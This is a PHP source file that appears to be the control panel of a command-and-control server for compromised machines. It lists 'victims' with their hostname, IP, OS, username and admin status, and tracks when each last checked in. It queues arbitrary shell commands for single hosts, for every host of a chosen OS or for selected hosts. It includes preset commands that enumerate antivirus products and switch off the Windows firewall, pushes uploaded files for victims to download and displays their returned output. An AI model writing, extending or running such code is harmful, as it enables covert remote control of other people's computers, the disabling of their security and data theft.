<?php
require_once("conn.php");
require_once("functions.php");

if (isset($_POST['checker'])) {
    $sql = "SELECT * FROM victims;";
    $stmt = mysqli_stmt_init($db);
    if (!mysqli_stmt_prepare($stmt, $sql)) {
        echo "SQL4 statement failed!";
    } else {
        $sql1  = 'SELECT Active, Last_Report FROM victims;';
        mysqli_stmt_execute($stmt);
        $result = mysqli_stmt_get_result($stmt);

        while ($row = mysqli_fetch_assoc($result)) {
            $user_identity = isset($row['user_identifier']) ? $row['user_identifier'] : null;
            if (strtotime($row["Last_Report"]) > strtotime("-3 minutes")) {
                $sql1 = "UPDATE victims SET Active='Yes' WHERE user_identifier =?";
                $stmt = mysqli_prepare($db, $sql1);
                mysqli_stmt_bind_param($stmt, 'i', $user_identity);
                mysqli_stmt_execute($stmt);
            } elseif (strtotime($row["Last_Report"]) < strtotime("-10000 minutes")) {
                $sql1 = "UPDATE victims SET Active='Connection Lost' WHERE user_identifier =?";
                $stmt = mysqli_prepare($db, $sql1);
                mysqli_stmt_bind_param($stmt, 'i', $user_identity);
                mysqli_stmt_execute($stmt);
            } else {
                $sql1 = "UPDATE victims SET Active='No' WHERE user_identifier =?";
                $stmt = mysqli_prepare($db, $sql1);
                mysqli_stmt_bind_param($stmt, 'i', $user_identity);
                mysqli_stmt_execute($stmt);
            }
        }

        $stmt = mysqli_prepare($db, $sql);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_store_result($stmt);
        $resultCheck = mysqli_stmt_num_rows($stmt);
        echo $resultCheck;
    }
}

//send command
if ($_SESSION['userId'] ==  1) {
    if ((isset($_POST['send_command']) && isset($_POST['user_identifier'])) || isset($_POST['send_command_all'])) {
        if (!empty($_POST['token'])) {
            if (hash_equals($_SESSION['token'], $_POST['token'])) {

                //for singular vickim.
                if (isset($_POST['user_identifier'])) {
                    $sql = "SELECT user_identifier,OS FROM victims WHERE user_identifier LIKE ?;";
                    $stmt = mysqli_stmt_init($db);
                    if (!mysqli_stmt_prepare($stmt, $sql)) {
                        echo "SQL4 statement failed!";
                    } else {
                        mysqli_stmt_bind_param($stmt, "s", $_POST['user_identifier']);
                        mysqli_stmt_execute($stmt);
                        if ($row = mysqli_fetch_assoc(mysqli_stmt_get_result($stmt))) {
                            $user_id[$row['user_identifier']] = $row['OS'];
                        }
                    }
                    $_POST['pkoda'] = $_POST['pkoda'] == "" ? $_POST['sleep_command'] : $_POST['pkoda'];
                } else {
                    $user_id = [];
                }

                $command = isset($_POST['command_to_all']) ? $_POST['command_to_all'] : $_POST['pkoda'];

                if (isset($_POST['send_command_all'])) {
                    if (empty($_POST['Windows']) && empty($_POST['Linux']) && empty($_POST['Macintosh']) && empty($_POST['Selected'])) {
                        header("Location: Dashboard?msg=not_choose_a_checkbox.");
                        exit();
                    }
                }

                if (isset($_POST['Windows'])) OS_list($db, '%win%');
                if (isset($_POST['Linux'])) OS_list($db, '%Lin%');
                if (isset($_POST['Macintosh'])) OS_list($db, '%Mac%');
                if (isset($_POST['Selected'])) {
                    foreach ($_POST['user_ids'] as $user) {
                        OS_list_selected($db, $user);
                    }
                }

                if ($command == "AV") {
                    $command = "wmic /node:localhost /namespace:\\\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed";
                }
                if ($command == "fireoff") {
                    $command = "adm NetSh Advfirewall set allprofiles state off";
                }

                foreach ($user_id as $user_identifier => $value) {
                    $date = date('Y-m-d H:i:s');
                    $challenge = rand(1, 10000000000000);
                    $sql = "INSERT INTO command (user_identifier, send_command, date, challenge) VALUES (?,?,?,?);";
                    $stmt = mysqli_stmt_init($db);
                    if (!mysqli_stmt_prepare($stmt, $sql)) {
                        echo "SQL statement failed!";
                        exit();
                    } else {
                        mysqli_stmt_bind_param($stmt, "isss", $user_identifier, $command, $date, $challenge);
                        mysqli_stmt_execute($stmt);
                        addLogs($db, $user_identifier, $date, 'INFO', "$command  - send Seccessfuly"); //LOG
                    }
                }

                if (isset($_POST['send_command_all'])) {
                    header("Location: Dashboard");
                } else {
                    header("Location: users?user_identifier=" . implode("", array_keys($user_id)));
                }
            } else {
                addLogs($db, $user_identifier, $date, 'Critical', "recive FALSE token! Be Careful!"); //LOG
                http_response_code(404);
            }
        } else {
            addLogs($db, $user_identifier, $date, 'Critical', "Dont recive token! Be Careful!"); //LOG
            http_response_code(404);
        }
    }
}
//upload file
if (isset($_POST['upload_file']) && isset($_POST['token'])) {
    $date = date('Y-m-d H:i:s');
    if (!empty($_POST['token'])) {
        if (hash_equals($_SESSION['token'], $_POST['token'])) {
            $target_dir = "download/";
            $target_file = $target_dir . basename($_FILES["file-upload"]["name"]);
            if (move_uploaded_file($_FILES['file-upload']['tmp_name'], $target_file)) {
                $answer = "The file: " . basename($_FILES['file-upload']['name']) . " has been uploaded successfully";
                $challenge = rand(1, 10000000000000);
                $command = "download^" . basename($_FILES['file-upload']['name']);
                $sql = "INSERT INTO command (user_identifier, send_command, date, challenge) VALUES (?,?,?,?);";
                $stmt = mysqli_stmt_init($db);
                if (!mysqli_stmt_prepare($stmt, $sql)) {
                    echo "SQL statement failed!";
                    exit();
                } else {
                    mysqli_stmt_bind_param($stmt, "isss", $_POST['user_identifier'], $command, $date, $challenge);
                    mysqli_stmt_execute($stmt);
                }
                addLogs($db, $_POST['user_identifier'], $date, 'INFO', "Upload file to server was succsesfuly"); //LOG
            } else {
                $answer = "There was an error uploading this file:" . basename($_FILES['file-upload']['name']);
                addLogs($db, $_POST['user_identifier'], $date, 'WARNING', $answer); //LOG
            }

            header("Location: users?user_identifier=" . $_POST['user_identifier']);
        } else {
            addLogs($db, $_SERVER['REMOTE_ADDR'], $date, 'Critical', "recive FALSE token! Be Careful!"); //LOG
            http_response_code(404);
        }
    } else {
        addLogs($db, $_SERVER['REMOTE_ADDR'], $date, 'Critical', "Dont recive token! Be Careful!"); //LOG
        http_response_code(404);
    }
}


if (isset($_POST['show_table'])) {
?>
    <table class="table table-striped table-bordered victim_table">
        <thead>
            <tr>
                <th>All<input type="checkbox" onClick="toggle(this)"></th>
                <th>#</th>
                <th>HostName</th>
                <th>IP</th>
                <th>Active</th>
                <th>Last Seen</th>
                <th>OS</th>
                <th>Username</th>
                <th>Is Admin</th>
                <th>Identifier</th>
                <th>Action</th>

            </tr>
        </thead>
        <tbody><?php
                $sql = "SELECT * FROM victims;";
                $stmt = mysqli_stmt_init($db);
                if (!mysqli_stmt_prepare($stmt, $sql)) {
                    echo "SQL4 statement failed!";
                } else {
                    $stmt = mysqli_prepare($db, $sql);
                    mysqli_stmt_execute($stmt);
                    $result = mysqli_stmt_get_result($stmt);

                    while ($row = mysqli_fetch_assoc($result)) {
                        echo '

           
    <tr>
        <td><input form="form_command" type="checkbox" value=' . (htmlspecialchars($row["user_identifier"])) . ' name="user_ids[]">&nbsp;</td>
        <td><a href="users?user_identifier=' . htmlspecialchars($row["user_identifier"]) . '">' . htmlspecialchars($row["id"]) . '</a></td>
        <td>' . htmlspecialchars($row["HostName"]) . '</td>
        <td>' . htmlspecialchars($row["IP"]) . '</td>
        <td>' . htmlspecialchars($row["Active"]) . '</td>
        <td>' . htmlspecialchars($row["Last_Report"]) . '</td>
        <td>' . htmlspecialchars($row["OS"]) . '</td>
        <td>' . htmlspecialchars($row["UserName"]) . '</td>
        <td>' . htmlspecialchars($row["isadmin"]) . '</td>
        <td>' . htmlspecialchars($row["user_identifier"]) . '</td>
        <td ><button name="delete" class="btn btn-danger btn-xs delete"
        value=' . htmlspecialchars($row["user_identifier"]) . ' onclick="delete_user(' . htmlspecialchars($row["user_identifier"]) . ')">Del </button>
        <button name="log" class="btn btn-info btn-xs float-end"><a href="log?user_identifier=' . htmlspecialchars($row["user_identifier"]) . '">Log </a></button>   </td>';
                ?>

                    <script>
                        $(document).ready(function() {
                            var table = $(".victim_table").DataTable()
                        });
                    </script>
                    </tr> <?php
                        }
                    }
                    echo ' </tbody></table>';
                }
                if (isset($_POST['action']) && isset($_POST['user_identifier'])) {
                    $sql = "DELETE FROM victims WHERE user_identifier = ?";
                    $stmt = mysqli_stmt_init($db);
                    if (!mysqli_stmt_prepare($stmt, $sql)) {
                        echo "SQL statement failed!";
                    } else {
                        mysqli_stmt_bind_param($stmt, "s", $_POST['user_identifier']);
                        mysqli_stmt_execute($stmt);
                        addLogs($db, $_POST['user_identifier'], date('Y-m-d H:i:s'), 'INFO', 'The user was deleted'); //LOG
                    }
                }
                if (isset($_POST['delete_log']) || isset($_POST['delete_logs'])) {
                    if (isset($_POST['delete_log'])) {
                        $delete = array($_POST['delete_log']);
                    } else {
                        $delete = $_POST['logs_id'];
                    }
                    foreach ($delete as $value) {
                        $sql = "DELETE FROM audits WHERE id = ?";
                        $stmt = mysqli_stmt_init($db);
                        if (!mysqli_stmt_prepare($stmt, $sql)) {
                            echo "SQL statement failed!";
                        } else {
                            mysqli_stmt_bind_param($stmt, "s", $value);
                            mysqli_stmt_execute($stmt);
                        }
                    }
                    header('Location: ' . $_SERVER['HTTP_REFERER']);
                }


                if (isset($_POST['refresh_user_output'])) {
                    $user_id = $_GET['varname'];

                    $sql = "SELECT      *
                            FROM        recive
                            WHERE       user_identifier = ?
                            ORDER BY    date DESC
                            LIMIT       1";

                    $stmt = mysqli_stmt_init($db);
                    if (!mysqli_stmt_prepare($stmt, $sql)) {
                        echo "SQL statement failed!";
                    } else {
                        mysqli_stmt_bind_param($stmt, "s", $user_id);
                        mysqli_stmt_execute($stmt);
                        $result = mysqli_stmt_get_result($stmt);

                        if ($row = mysqli_fetch_assoc($result)) {
                            echo nl2br(htmlspecialchars($row['revice_output']));
                        }
                    }
                }
